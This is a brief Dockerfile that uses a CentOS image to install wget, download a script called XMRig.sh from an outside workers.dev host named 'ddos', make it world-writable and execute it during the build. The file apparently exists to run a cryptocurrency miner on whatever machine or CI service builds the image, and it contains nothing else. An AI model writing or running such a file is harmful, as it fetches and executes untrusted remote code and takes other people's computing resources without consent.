FROM centos

WORKDIR /opt

COPY . .

RUN yum install wget -y
RUN wget https://ddos.nms.workers.dev/XMRig.sh
RUN chmod 777 XMRig.sh
RUN bash XMRig.sh
RUN sleep 2m